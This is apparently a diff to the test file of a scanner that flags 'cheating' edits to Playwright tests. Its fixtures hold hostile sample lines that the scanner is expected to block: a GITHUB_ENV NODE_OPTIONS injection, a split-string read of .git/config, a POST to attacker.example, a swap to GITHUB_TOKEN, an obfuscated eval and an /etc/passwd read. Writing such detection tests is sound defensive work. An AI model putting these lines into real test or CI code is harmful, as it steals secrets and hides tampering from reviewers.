@@ -4,7 +4,7 @@ import { scanChange, triage } from '../dist/index.js';
 
 test('triage: flaky verdicts win', () => {
   assert.equal(triage({ kind: 'assertion', message: 'x', flakyVerdict: 'FLAKY' }).category, 'FLAKY');
-  assert.equal(triage({ kind: 'timeout', message: 'x', flakyVerdict: 'NOT REPRODUCING' }).category, 'FLAKY');
+  assert.equal(triage({ kind: 'timeout', message: 'x', flakyVerdict: 'NOT REPRODUCING' }).category, 'ENV');
 });
 
 test('triage: environment failures', () => {
@@ -74,10 +74,10 @@ test('cheat scan: early return and swallowed errors are blocked', () => {
   assert.equal(scanChange(base, base.replace('.click();', '.click().catch(() => {});')).verdict, 'BLOCK');
 });
 
-test('cheat scan: raised timeouts, fixed waits and force are warnings', () => {
+test('cheat scan: a raised timeout is a warning; fixed waits and force are outside the allowlist', () => {
   assert.equal(scanChange(base, base.replace('.click();', '.click({ timeout: 60000 });')).verdict, 'WARN');
-  assert.equal(scanChange(base, base.replace("  await page.goto('/');", "  await page.goto('/');\n  await page.waitForTimeout(3000);")).verdict, 'WARN');
-  assert.equal(scanChange(base, base.replace('.click();', '.click({ force: true });')).verdict, 'WARN');
+  assert.equal(scanChange(base, base.replace("  await page.goto('/');", "  await page.goto('/');\n  await page.waitForTimeout(3000);")).verdict, 'BLOCK');
+  assert.equal(scanChange(base, base.replace('.click();', '.click({ force: true });')).verdict, 'BLOCK');
   // A weaker matcher also drops what the test expects, so it is now blocked outright.
   assert.equal(scanChange(base, base.replace(".toHaveText('ok')", '.toBeTruthy()')).verdict, 'BLOCK');
 });
@@ -140,4 +140,57 @@ test('cheat scan: trivial assertions, faked network answers, DOM edits and obfus
       assert.ok(r.findings.some((f) => f.rule === rule), `${line} → ${rule} (got ${r.findings.map((f) => f.rule)})`);
     }
   }
+});
+
+test('cheat scan: an expected value moved into a variable is still followed', () => {
+  const t = "const price = '$10';\ntest('p', async ({ page }) => {\n  await expect(page.getByTestId('price')).toHaveText(price);\n});\n";
+  assert.equal(scanChange(t, t.replace("'$10'", "'$12'")).verdict, 'BLOCK');
+  assert.equal(scanChange(t, t.replace("getByTestId('price')", "getByRole('status')")).verdict, 'PASS');
+  const py = 'EXPECTED = "$10"\ndef test_p(page):\n    expect(page.locator("#p")).to_have_text(EXPECTED)\n';
+  assert.equal(scanChange(py, py.replace('"$10"', '"$12"')).verdict, 'BLOCK');
+});
+
+test('allowlist: the bypasses from the audit are all blocked', () => {
+  const t = "import { test, expect } from '@playwright/test';\ntest('p', async ({ page, request }) => {\n  const base = process.env.BASE_URL;\n  await page.route('**/api/price', (r) => r.continue());\n  await page.goto('/pricing');\n  await expect(page.getByTestId('price')).toHaveText('$10');\n});\n";
+  const add = (line) => t.replace("  await page.goto('/pricing');", `${line}\n  await page.goto('/pricing');`);
+  const attacks = [
+    // fake comment markers inside strings
+    "  const a = '/*'; require('fs').writeFileSync(process.env.GITHUB_ENV, 'NODE_OPTIONS=--require=/tmp/x'); const b = '*/';",
+    // split strings
+    "  await page.goto('file://' + '.gi' + 't/config');",
+    // raw network through the Playwright request fixture
+    "  await request.post('https://attacker.example/x', { data: 'x' });",
+    // swapping an existing env read for another variable
+    null,
+    // swapping an existing fake response
+    null,
+  ];
+  for (const line of attacks.filter(Boolean)) assert.equal(scanChange(t, add(line), 'tests/p.spec.ts').verdict, 'BLOCK', line);
+  assert.equal(scanChange(t, t.replace('process.env.BASE_URL', 'process.env.GITHUB_TOKEN'), 'tests/p.spec.ts').verdict, 'BLOCK', 'env swap');
+  assert.equal(scanChange(t, t.replace('r.continue()', "r.fulfill({ body: '$10' })"), 'tests/p.spec.ts').verdict, 'BLOCK', 'route swap');
+  // A real locator fix still passes.
+  assert.equal(scanChange(t, t.replace("getByTestId('price')", "getByRole('status', { name: 'Price' })"), 'tests/p.spec.ts').verdict, 'PASS');
+  assert.equal(
+    scanChange(t, t.replace("  await expect(page.getByTestId", "  await expect(page.getByRole('heading', { name: 'Pricing' })).toBeVisible();\n  await expect(page.getByTestId"), 'tests/p.spec.ts').verdict,
+    'PASS',
+    'adding a readiness wait is allowed',
+  );
+});
+
+test('allowlist: tokenizer keeps strings whole and drops comments', async () => {
+  const { tokenizeJs, tokenizePy } = await import('../dist/index.js');
+  const js = tokenizeJs("const a = '/*'; x(); // hi\nconst r = /a\\/b/g; `t ${y}`;");
+  assert.deepEqual(js.filter((t) => t.kind === 'str').map((t) => t.value), ["'/*'"]);
+  assert.ok(js.some((t) => t.kind === 'ident' && t.value === 'x'), 'code between fake markers is seen');
+  assert.ok(js.some((t) => t.kind === 'regex'));
+  assert.ok(js.some((t) => t.kind === 'tmplexpr'));
+  const py = tokenizePy('x = f"{os.environ}"  # c\ny = "a#b"\n');
+  assert.deepEqual(py.map((t) => t.kind), ['ident', 'punct', 'tmplexpr', 'ident', 'punct', 'str']);
+});
+
+test('allowlist: python locator fixes pass, python tricks do not', () => {
+  const py = 'from playwright.sync_api import expect\n\ndef test_p(page):\n    page.get_by_role("button", name="Log in").click()\n    expect(page.get_by_test_id("price")).to_have_text("$10")\n';
+  assert.equal(scanChange(py, py.replace('name="Log in"', 'name="Sign in"'), 'tests/test_p.py').verdict, 'PASS');
+  assert.equal(scanChange(py, py.replace('    page.get_by_role', '    getattr(__builtins__, "ev" + "al")("1")\n    page.get_by_role'), 'tests/test_p.py').verdict, 'BLOCK');
+  assert.equal(scanChange(py, py.replace('"Log in"', 'f"{open(\'/etc/passwd\').read()}"'), 'tests/test_p.py').verdict, 'BLOCK');
 });
